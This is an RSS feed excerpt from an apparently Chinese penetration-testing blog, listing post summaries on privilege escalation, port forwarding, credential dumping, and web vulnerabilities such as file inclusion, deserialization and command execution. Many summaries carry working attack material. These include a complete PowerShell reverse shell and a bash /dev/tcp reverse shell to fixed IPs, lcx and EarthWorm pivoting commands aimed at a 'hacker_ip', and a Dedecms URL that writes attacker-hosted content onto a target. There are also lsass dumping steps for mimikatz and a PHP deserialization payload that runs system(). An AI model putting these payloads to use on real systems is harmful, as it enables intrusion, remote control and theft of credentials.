      <pubDate>Thu, 11 Aug 2016 23:26:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/python-module-scapy/</guid>
      <description> 0x00 简单尝试 0x01 生成一组数据包 0x02 发送数据包  send发送数据包  sr1发送数据包  sr发送数据包   0x03 发送SYN数据包 0x04 得到TCP内容 0x05 SYN Scans </description>
    </item>
    
    <item>
      <title>Web常见漏洞脑图</title>
      <link>http://wyb0.com/posts/2016/mind-map-of-web-common-vulnerabilities/</link>
      <pubDate>Thu, 11 Aug 2016 21:17:21 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/mind-map-of-web-common-vulnerabilities/</guid>
      <description> Web常见漏洞 </description>
    </item>
    
    <item>
      <title>SSH免密登录及SSH隧道</title>
      <link>http://wyb0.com/posts/2016/linux-ssh-connect/</link>
      <pubDate>Wed, 10 Aug 2016 11:46:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-ssh-connect/</guid>
      <description>0x00 SSH相关选项  -V 显示版本 -f 输入密码后进入后台模式 -N 不执行远程命令，一般与-f连用，用于端口转发 -C 压缩传输的数据，网速快时会影响速度  
 -L l_port:r_host:r_port(将本地机的某个端口转发到远端指定机器的指定端口) -R l_port:r_host:r_port(将远程主机的某个端口转发到本地端指定机器的指定端口) -D l_port (指定一个本地机器 &amp;ldquo;动态的&amp;rdquo; 应用程序端口转发，目前支持SOCKS4和SOCKS5协议)  0x01 环境 A主机: 外网IP 222.222.222.222，内网IP 无 B主机: 外网IP 123.123.123.123，内网IP 192.168.1.10 C主机: 外网IP 无， 内网IP 192.168.1.11  0x02 SSH 免密登陆 A主机免密码登陆B主机：
#A主机执行ssh-keygen -t rsa生成两个文件~/.ssh/id_rsa和~/.ssh/id_rsa.pub reber@ubuntu-linux:~$ ssh-keygen -t rsa #然后将id_rsa.pub中的内容复制到B主机的~/.ssh/authorized_keys中即可 #ssh-copy-id的功能就是将本机的公钥写入远端主机，也可以登录远端主机手工写入 reber@ubuntu-linux:~$ ssh-copy-id root@123.123.123.123 The authenticity of host &#39;123.123.123.123 (123.123.123.123)&#39; can&#39;t be established. RSA key fingerprint is a7:46:e4:9a:18:65:4e:8e:0b:8a:22:15:7d:91:a7:7f.</description>
    </item>
    
    <item>
      <title>Linux下系统漏洞提权</title>
      <link>http://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Tue, 09 Aug 2016 19:23:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</guid>
      <description>0x00 Linux下的提权 Linux下一般都是系统漏洞提权，分为以下几个步骤：
1. 获取系统版本号 2. 根据系统版本号找对应exp 3. 反弹shell 4. 尝试利用  0x01 提权  获取系统版本号  获取发行版本  cat /etc/*-release cat /etc/issue cat /etc/lsb-release cat /etc/redhat-release  获取内核版本  cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz   根据系统版本号找对应exp  http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules http://securityreason.com http://seclists.org/fulldisclosure http://www.google.com  反弹shell  本地：nc -l -p 8888 目标机器：/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.</description>
    </item>
    
    <item>
      <title>端口转发</title>
      <link>http://wyb0.com/posts/2016/port-forwarding/</link>
      <pubDate>Mon, 08 Aug 2016 19:33:45 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/port-forwarding/</guid>
      <description> 0x00 应用场景  内网IP的80端口通过端口映射到了外网IP的80端口上 内网的Web服务器通过外网IP反向代理(如Nginx) 也就是说Web服务器在内网中  0x01 判断Web是否为内网  向ping域名，查看IP是外网 用webshell查看ip却是内网IP  0x02 端口转发工具  lcx htran EarthWorm netsh reGeorg meterpreter porfwd  0x03 lcx端口转发  Hacker：lcx.exe -listen 500 8888 Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389 Hacker：cmd mstsc hacker_ip:500  0x04 EarchWorm端口转发  Hacker：./ew -s rcsocks -l 1080 -e 8888 Victim：./ew -s rssocks -d hacker_ip -e 8888 1. 启动EarchWorm 2. hacker主机使用代理 3. hacker内网主机连接目标的内网主机   </description>
    </item>
    
    <item>
      <title>导出Windows主机密码与开启3389</title>
      <link>http://wyb0.com/posts/2016/export-host-password-and-open-3389/</link>
      <pubDate>Mon, 08 Aug 2016 08:28:27 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/export-host-password-and-open-3389/</guid>
      <description>0x00 导出主机密码hash  关于Windows的hash
 早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash Windows hash由LM HASH和NT HASH两部分组成，形式为：用户名称:RID:LM-HASH值:NT-HASH值 存储Windows hash的sam文件位置为：C:\windows\system32\config\SAM  导出hash条件
 administrator以上权限  导出hash工具
 wce gethash hashdump SAMInside  上传工具得到hash  在线网站解密hash
 LM Hash和NT Hash得到一个就可以解密，不过两个都得到的话解密的成功率会更高 可以在http://www.objectif-securite.ch/ophcrack.php解密    0x01 导出主机密码  条件
 administrator以上权限 当前管理员没有注销登陆(可以通过query user命令看出)  工具
 mimikatz getpass  上传工具得到密码  导出NTLM Hash本地得到密码
若mimikatz和getpass这类软件被杀的话可以先用Procdump导出lsass.dmp，然后本地用mimikatz解密，Procdump是微软官方的软件，应该不会被杀
 导出文件dmp文件
 上传Procdump.exe导出   Procdump.exe -accepteula -ma lsass.exe lsass.dmp    或者执行PowerShell导出   powershell IEX (New-Object Net.</description>
    </item>
    
    <item>
      <title>Windows下第三方服务提权</title>
      <link>http://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 23:38:58 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</guid>
      <description> 0x00 MSSQL提权 MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权
提权条件：数据库账号是DBA权限
 关于xp_cmdshell
 得到数据库连接信息，连接数据库后执行EXEC xp_cmdshell &#39;net user&#39;; 有sql注入时也可以直接在url上使用xp_cmdshell，因为mssql可以多语句执行，例如?id=1;EXEC xp_cmdshell &#39;net user&#39;;--  连接数据库  执行系统命令  添加用户  远程连接   0x01 MySQL提权 环境：web应用服务器权限较低
提权条件：MySQL是system权限
 关于UDF  MySQL提权可以用UDF和Mof。UDF就是User defined Function，即用户定义函数，可以通过创建存储方法来定义函数，从而调用系统命令。
 UDF提权过程
 导入udf.dll到服务器指定目录
 MySQL版本小于5.1的udf.dll要导入到c:\windows\目录下
 MySQL版本大于等于5.1的udf.dll要导入到plugin_dir目录，plugin_dir在MySQL安装目录下的lib/plugin目录下(MySQL安装目录可以用select @@basedir得到)，默认不存在这个目录，我们要自己创建  使用SQL语句创建功能函数
CREATE FUNCTION shell RETURNS STRING SONAME &amp;lsquo;udf.dll&amp;rsquo;; 执行MySQL语句调用新创建的函数
select shell(&amp;lsquo;cmd&amp;rsquo;,&amp;lsquo;whoami&amp;rsquo;); 删除创建的函数
drop function shell;  查看基本信息  上传udf提权  添加用户  远程连接   </description>
    </item>
    
    <item>
      <title>Windows下系统漏洞提权</title>
      <link>http://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 21:31:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</guid>
      <description> 提权是在已经getshell但是权限不大的前提下做的
0x00 查看基本信息 0x01 使用cmd执行命令  尝试使用cmd执行命令  找可写目录  尝试上传cmd.exe  写一个aspx马  上传cmd.exe  再次尝试使用cmd执行命令   0x02 权限提升  查看未安装补丁
systeminfo&amp;gt;a.txt&amp;amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644) do @type a.txt|@find /i &amp;quot;%i&amp;quot;||@echo %i Not Installed!)&amp;amp;del /f /q /a a.txt   上传exp提权   0x03 添加用户  添加远程连接用户  0x04 使用3389远程连接 </description>
    </item>
    
    <item>
      <title>反弹shell小结</title>
      <link>http://wyb0.com/posts/2016/reverse-shell/</link>
      <pubDate>Sat, 06 Aug 2016 08:36:53 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/reverse-shell/</guid>
      <description>当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令
0x00 PowerShell #更换ip和端口即可 本地：nc -lv 8888 目标：powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a=&#39;10.10.10.10&#39;;$p=&#39;8888&#39;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&#39;cmd.exe&#39;;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne -1){$o += $e.</description>
    </item>
    
    <item>
      <title>Dedecms远程写文件漏洞</title>
      <link>http://wyb0.com/posts/2016/dedecms-remote-write-file-vulnerability/</link>
      <pubDate>Fri, 05 Aug 2016 23:29:20 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/dedecms-remote-write-file-vulnerability/</guid>
      <description> 0x00 关于漏洞 Dedecms在20150618之前的版本都存在远程写文件漏洞，主要起因是Apache的解析漏洞  0x01 利用条件 dedecms版本为20150618之前的 安装目录install下的index.php.bak文件未被删除  0x02 实例  查看cms版本  清空文件
http://www.xxxx.com/install/index.php.bak?step=11&amp;amp;insLockfile=a &amp;amp;s_lang=a&amp;amp;install_demo_name=../data/admin/config_update.php 访问上面的链接会使服务器到http://updatenew.dedecms.com/base-v57/dedecms/ demodata.a.txt中读取内容写入到config_update.php，但demodata.a.txt为空， 所以就清空了config_update.php   在自己的服务器上创建文件  写入文件
访问http://www.xxxx.com/install/index.php.bak?step=11&amp;amp;insLockfile=a &amp;amp;s_lang=a&amp;amp;install_demo_name=info.php&amp;amp;updateHost=http://123.123.123.123/ 将自己的网站的dedecoms/demodata.a.txt写入到目标站点的install/下的info.php中   访问生成的文件   </description>
    </item>
    
    <item>
      <title>Redis未授权访问漏洞</title>
      <link>http://wyb0.com/posts/2016/redis-unauthorized-access/</link>
      <pubDate>Thu, 04 Aug 2016 15:52:26 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/redis-unauthorized-access/</guid>
      <description> 0x00 Redis的未授权访问 若Redis服务器对公网开放，且未启用认证，则攻击者可以未授权访问服务器。
若Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，通过SSH登录受害服务器。
0x01 写shell 连接目标主机的redis写文件 0x02 向Redis服务器上传SSH公钥 0x03 通过计划任务反弹shell </description>
    </item>
    
    <item>
      <title>Redis的简单使用</title>
      <link>http://wyb0.com/posts/2016/redis-bisis-use/</link>
      <pubDate>Wed, 03 Aug 2016 11:02:20 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/redis-bisis-use/</guid>
      <description>0x00 关于Redis Redis和MySQL这种关系型数据库不一样，它是非关系型数据库，是日志型、Key-Value数据库， 实现了master-slave(主从)同步,数据都是缓存在内存中的,所以可高速读写,但存储成本较高, 不适合做海量数据存储。  0x01 安装  Linux下安装Redis 可在http://download.redis.io/releases/ 下载
$ cd /opt $ wget http://download.redis.io/releases/redis-3.2.3.tar.gz $ tar -zxvf redis-3.2.3.tar.gz $ cd redis-3.2.3 $ make $ make install  Windows下安装Redis 下载：点此下载
  安装后添加环境变量
添加为系统服务： redis-server.exe --service-install redis.windows.conf --loglevel verbose 启动服务： redis-server.exe --service-start 关闭服务： redis-server.exe --service-stop 为Redis添加密码： 打开安装目录下的文件redis.windows-service.conf， 找到requirepass，配置为requirepass mypassword，然后重启redis 此时仍然可以连接上，但是执行命令时会提示没权限 带密码连接Redis： redis-cli.exe -h 127.0.0.1 -p 6379 -a mypassword  0x02 产生的可执行文件 redis-server：redis服务器启动程序 redis-cli：redis命令行工具，也可为客户端 redis-stat：redis状态检测工具 redis-benchmark：redis性能检测工具(读写)  0x03 配置文件 $ vim /opt/redis-3.</description>
    </item>
    
    <item>
      <title>Tomcat部署War包getshell</title>
      <link>http://wyb0.com/posts/2016/tomcat-deploy-war-package-to-getshell/</link>
      <pubDate>Tue, 02 Aug 2016 22:30:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/tomcat-deploy-war-package-to-getshell/</guid>
      <description>0x00 关于 War 包 War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码, 以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布 则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat 服务器启动时,War包也会随之被解压后自动部署。  0x01 上传 War 包 GetShell  找到后台猜密码然后登录  上传 War 包
  运行 jar -cf job.war ./job.jsp 生成 war 包
或者先将 jsp 大马压缩为 zip，再将 zip 后缀改名为 war ，然后上传 war 包
0x02 漏洞防御  后台使用强密码 删除Tomcat下的manager文件夹  0x03 附爆破弱口令代码 #!/usr/bin/env python #-*- coding:utf-8 -*- import requests import json import base64 import sys import Queue import threading &amp;quot;&amp;quot;&amp;quot; 简单爆破后台登陆密码 Usage: python tomcat.</description>
    </item>
    
    <item>
      <title>CGI与FastCGI与PHP-FPM</title>
      <link>http://wyb0.com/posts/2016/cgi-and-fastcgi-and-php-fpm/</link>
      <pubDate>Tue, 02 Aug 2016 10:45:14 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/cgi-and-fastcgi-and-php-fpm/</guid>
      <description> 0x01 CGI协议 中间件在收到请求时会去找php解析器处理，cgi是规定了要传递哪些数据(比如url、header、post数据等)的协议
0x02 FastCGI 服务端收到请求时会启动对应的cgi程序(如php-cgi)，即php的解析器，php解析器会解析php.ini文件、初始化执行环境，然后执行请求，每次都是这样，性能比较低
fastcgi是cgi的升级版，它会启动一个master解析php.ini、初始化执行环节，然后启动多个worker直接依次处理多个web server的连接，不用每次都解析php.ini等
0x03 FastCGI工作流程 一般情况下，FastCGI的整个工作流程是这样的：
 Web Server启动时载入FastCGI进程管理器（IIS ISAPI或Apache Module) FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可见多个php-cgi)并等待WebServer的连接。 当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。 Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。 FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。在CGI模式中，php-cgi在此便退出了。  0x04 PHP-FPM  php-fpm就是fastcgi的实现，是一个php fastcgi进程管理器 php-fpm在php5.2之后默认添加 千万不要把fastcgi端口对公网暴露  </description>
    </item>
    
    <item>
      <title>BurpSuite的Intruder模块</title>
      <link>http://wyb0.com/posts/2016/burpsuite-intruder-module/</link>
      <pubDate>Mon, 01 Aug 2016 09:17:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/burpsuite-intruder-module/</guid>
      <description> 0x00 示例一 0x01 示例二 </description>
    </item>
    
    <item>
      <title>逻辑漏洞</title>
      <link>http://wyb0.com/posts/2016/logical-loophole/</link>
      <pubDate>Sun, 31 Jul 2016 18:43:49 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/logical-loophole/</guid>
      <description>0x00 逻辑漏洞 逻辑漏洞是一种业务逻辑上的设计缺陷，业务流存在问题。 这里说一下密码找回漏洞、多线程条件竞争漏洞和支付漏洞。
0x01 密码找回漏洞  测试流程
 先尝试正确的密码找回流程，记录不同找回方式的所有数据包 分析数据包，找到有效数据部分 推测数据构造方法 构造数据包验证猜测  分类
 邮箱找回
一般是点击邮件中的链接后会转跳到修改密码的页面，需要分析链接的token构造，可以考虑是时间戳md5、用户名或邮箱和随机字符串md5等，一般是类似如下链接： http://domain/findpwd.php?u=xiaoming&amp;amp;token=MTIzQHFxLmNvbQ== http://domain/findpwd.php?id=374&amp;amp;token=2ad64bf14c714dbce88c7993663da7da 当构造相应链接时就可以重置任意用户的密码  手机短信找回
短信找回一般就是4位或6位验证码，暴力猜测吧  找回逻辑错误
若恶意用户A用15123333333找回密码，此时收到验证码但不使用 此时恶意用户A再用受害者B的手机号找回密码 用户A在B的验证表单填入自己收到的验证码，发送 此时跳转的修改密码页面修改的就是用户B的密码  直接修改密码
在修改密码时跳过选择找回方式，直接访问修改密码的页面进行修改  本地验证
随意输入一个验证码，开Burp抓包，forward，抓返回包，返回包里可能有一个flag字段， 若flag的值为1则跳转到修改密码页面，所以只要修改返回包即可  服务端将验证码返回给浏览器
在点击获取验证码时，服务器会将验证码发送给浏览器，抓包即可  验证码直接出现在url中
当点击获取验证码时发出的请求链接中直接有code  密保问题找回
回答密保问题，有时一些答案就在html源码里    0x02 多线程条件竞争漏洞 多线程条件竞争漏洞是一种服务端的漏洞，服务端是并发处理用户请求的，若并发处理不当或相关操作逻辑设计有缺陷时就会产生一些安全问题。
 文件上传  服务端可以sudo apt-get install inotify-tools安装监听文件的软件，执行inotifywait -m /var/www/html/admin监听admin文件夹中文件的变化
//uploads.php代码如下，仅供测试： &amp;lt;meta charset=&#39;utf-8&#39;&amp;gt; &amp;lt;?php $allowtype = array(&amp;quot;gif&amp;quot;,&amp;quot;png&amp;quot;,&amp;quot;jpg&amp;quot;); $size = 10000000; $path = &amp;quot;.</description>
    </item>
    
    <item>
      <title>敏感信息泄露</title>
      <link>http://wyb0.com/posts/2016/sensitive-information-leakage/</link>
      <pubDate>Thu, 28 Jul 2016 22:42:58 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/sensitive-information-leakage/</guid>
      <description>0x00 软件敏感信息 * 操作系统版本 可用namp扫描得知 * 中间件的类型、版本 http返回头 404报错页面 使用工具(如whatweb) * Web程序(cms类型及版本、敏感文件) 可用whatweb、cms_identify  0x01 Web敏感信息 * phpinfo()信息泄露 http://[ip]/test.php和http://[ip]/phpinfo.php * 测试页面泄露在外网 test.cgi、phpinfo.php、info.php等 * 编辑器备份文件泄露在外网 http://[ip]/.test.php.swp http://[ip]/test.php.bak http://[ip]/test.jsp.old http://[ip]/cgi~ 常见编辑器备份后缀 * 版本管理工具(如git)文件信息泄露 http://[ip]/.git/config http://[ip]/CVS/Entriesp http://[ip]/.svn/entriesp * HTTP认证泄露漏洞 http://[ip]/basic/index.php Web目录开启了HTTP Basic认证，但未限制IP，导致可暴力破解账号、密码 * 管理后台地址泄露 http://[ip]/login.php http://[ip]/admin.php http://[ip]/manager.php http://[ip]/admin_login.php * 泄露员工邮箱、分机号码 泄露邮箱及分机号码可被社工，也可生成字典 * 错误页面暴漏信息 mysql错误、php错误、暴漏cms版本等 * 探针文件 * robots.txt * phpMyAdmin * 网站源码备份文件(www.rar/sitename.tar.gz/web/zip等) * 其他  0x02 网络信息泄露 * DNS域传送漏洞 * 运维监控系统弱口令、网络拓扑泄露 zabbix弱口令、zabbix sql注入等  0x03 第三方软件应用 * github上源码、数据库、邮箱密码泄露 搜类似：smtp 163 password关键字 * 百度网盘被员工不小心上传敏感文件 * QQ群被员工不小心上传敏感文件  0x04 敏感信息搜集工具 https://github.</description>
    </item>
    
    <item>
      <title>任意文件查看与下载漏洞</title>
      <link>http://wyb0.com/posts/2016/any-file-view-and-download-vulnerability/</link>
      <pubDate>Wed, 27 Jul 2016 23:25:18 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/any-file-view-and-download-vulnerability/</guid>
      <description>0x00 漏洞介绍 一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞
0x01 利用条件 * 存在读文件的函数 * 读取文件的路径用户可控且未校验或校验不严 * 输出了文件内容  0x02 漏洞危害 下载服务器任意文件，如脚本代码、服务及系统配置文件等 可用得到的代码进一步代码审计，得到更多可利用漏洞  0x03 任意文件读取 代码形式可如下几种：
&amp;lt;?php $filename = &amp;quot;test.txt&amp;quot;; readfile($filename); ?&amp;gt; &amp;lt;?php $filename = &amp;quot;test.txt&amp;quot;; $fp = fopen($filename,&amp;quot;r&amp;quot;) or die(&amp;quot;Unable to open file!&amp;quot;); $data = fread($fp,filesize($filename)); fclose($fp); echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;; print_r(htmlspecialchars($data)); echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;; ?&amp;gt; &amp;lt;?php $filename = &amp;quot;test.txt&amp;quot;; $data = file_get_contents($filename); echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;; print_r(htmlspecialchars($data)); echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;; ?&amp;gt;  0x04 任意文件下载 直接下载：
&amp;lt;a href=&amp;quot;http://www.xx.com/a.zip&amp;quot;&amp;gt;Download&amp;lt;/a&amp;gt;  用header()下载：</description>
    </item>
    
    <item>
      <title>文件包含漏洞</title>
      <link>http://wyb0.com/posts/2016/file-include-vulnerabilities/</link>
      <pubDate>Tue, 26 Jul 2016 09:24:22 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/file-include-vulnerabilities/</guid>
      <description>环境：phpStudy 2016、DVWA v1.10
0x00 文件包含 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。
程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。
几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多,而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。
在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。
0x01 常见文件包含函数 include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行 require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本 include_once()和require_once()：若文件中代码已被包含则不会再次包含  0x02 利用条件  程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量  注：PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析， 若文件内容不符合PHP语法规范则会暴漏其源码。包含不存在的文件则可能暴露路径  0x03 漏洞危害  执行任意代码 读取文件源码或敏感信息 包含恶意文件控制网站 甚至控制服务器  0x04 漏洞分类  本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码  读敏感文件，读PHP文件 包含日志文件GetShell 上传图片马，然后包含从而GetShell 包含/proc/self/envion文件GetShell 包含data:或php://input等伪协议 若有phpinfo则可以包含临时文件  远程文件包含：可以直接执行任意代码  要保证php.ini中allow_url_fopen和allow_url_include要为On   0x05 漏洞挖掘  上AWVS或者自己写代码测试
 0x06 本地包含GetShell  简单代码示例  &amp;lt;?php if (@$_GET[&#39;page&#39;]) { include(&amp;quot;./action/&amp;quot;.$_GET[&#39;page&#39;]); } else { include &amp;quot;.</description>
    </item>
    
    <item>
      <title>PHP反序列化漏洞</title>
      <link>http://wyb0.com/posts/2016/php-unserialize-vulnerabilities/</link>
      <pubDate>Mon, 25 Jul 2016 23:32:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/php-unserialize-vulnerabilities/</guid>
      <description>0x00 关于反序列化漏洞 序列化：使用函数serialize()可将实例序列化为字符串
反序列化：使用函数unserialize()可将序列化的字符串还原
 服务端有test.php，代码如下  &amp;lt;?php class fun{ public $msg; function __construct(){ echo &#39;__construct&#39;; } function __destruct() { eval($this-&amp;gt;msg); } } $d = $_REQUEST[&#39;str&#39;]; var_dump($d); echo &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $tc = unserialize($d); var_dump($tc); ?&amp;gt;   客户端可构造如下代码生成序列化后的字符串  &amp;lt;?php class fun{ public $msg; function __construct(){ echo &#39;__construct&#39;; } function __destruct() { eval($this-&amp;gt;msg); } } $f = new fun(); $f-&amp;gt;msg = &amp;quot;system(&#39;ls /etc/ssh&#39;);&amp;quot;; echo serialize($f); ?&amp;gt;  生成的序列化字符串为：O:3:&amp;quot;fun&amp;quot;:1:{s:3:&amp;quot;msg&amp;quot;;s:22:&amp;quot;system(&#39;ls /etc/ssh&#39;);&amp;quot;;}</description>
    </item>
    
    <item>
      <title>代码执行漏洞(一)</title>
      <link>http://wyb0.com/posts/2016/code-execution-vulnerabilities/</link>
      <pubDate>Mon, 25 Jul 2016 22:32:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/code-execution-vulnerabilities/</guid>
      <description>0x00 代码执行 当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。
0x01 相关函数 PHP：eval assert Python：exec asp：&amp;lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&amp;gt; Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能  0x02 phpcms中的string2array函数 这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组
array( //这个是字符串形式的数组，它并不是数组，而是字符串 &#39;upload_maxsize&#39; =&amp;gt; &#39;2048&#39;, &#39;upload_allowext&#39; =&amp;gt; &#39;jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf&#39;, &#39;watermark_enable&#39; =&amp;gt; &#39;1&#39;, &#39;watermark_minwidth&#39; =&amp;gt; &#39;300&#39;, &#39;watermark_minheight&#39; =&amp;gt; &#39;300&#39;, &#39;watermark_img&#39; =&amp;gt; &#39;/statics/img/water/mark.png&#39;, &#39;watermark_pct&#39; =&amp;gt; &#39;85&#39;, &#39;watermark_quality&#39; =&amp;gt; &#39;80&#39;, &#39;watermark_pos&#39; =&amp;gt; &#39;9&#39;, )  function string2array($data) { //这个函数可以将字符串$data转化为数组 if($data == &#39;&#39;) return array(); @eval(&amp;quot;\$array = $data;&amp;quot;); return $array; }  0x03 漏洞危害  执行代码 让网站写shell 甚至控制服务器  0x04 漏洞分类(也是利用点) 执行代码的函数：eval、assert callback函数：preg_replace + /e模式 反序列化：unserialize()(反序列化函数)  0x05 漏洞挖掘 框架找漏洞，如ThinkPHP： inurl:index.</description>
    </item>
    
    <item>
      <title>Windows下用Proxifier实现全局代理</title>
      <link>http://wyb0.com/posts/2016/windows-proxifier-implement-global-proxy/</link>
      <pubDate>Sun, 24 Jul 2016 21:33:59 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/windows-proxifier-implement-global-proxy/</guid>
      <description> 0x00 环境 在windows下用Shadowsocks和Proxifier实现全局代理：
System：Windows10 Pro x64 Shadowsocks：Shadowsocks v2.5.2.0 Proxifier：Proxifier Portable Edition v3.29  0x01 配置Shadowsocks 0x02 配置Proxifier  Proxifier添加代理服务  Proxifier添加规则  测试全局代理设置成功与否   </description>
    </item>
    
    <item>
      <title>命令执行漏洞</title>
      <link>http://wyb0.com/posts/2016/command-execution-vulnerabilities/</link>
      <pubDate>Sun, 24 Jul 2016 14:32:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016/command-execution-vulnerabilities/</guid>
      <description>0x00 命令执行 应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、 passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令 拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。  0x01 利用条件  应用调用执行系统命令的函数 将用户输入作为系统命令的参数拼接到了命令行中 没有对用户输入进行过滤或过滤不严  0x02 漏洞分类  代码层过滤不严
商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：
system(&amp;ldquo;/bin/program --arg $arg&amp;rdquo;); 系统的漏洞造成命令执行
bash破壳漏洞(CVE-2014-6271)
执行env x=&#39;() { :;}; echo vulnerable&#39; bash -c &amp;quot;echo this is a test&amp;quot;后
若输出vulnerable则证明存在漏洞 调用的第三方组件存在代码执行漏洞
如WordPress中用来处理图片的ImageMagick组件
JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)
ThinkPHP命令执行  0x03 漏洞危害  继承Web服务程序的权限去执行系统命令或读写文件 反弹shell 控制整个网站甚至控制服务器 进一步内网渗透 等等  0x04 漏洞挖掘 可以google hacking
尝试：filetype:action或filetype:do来找struts2
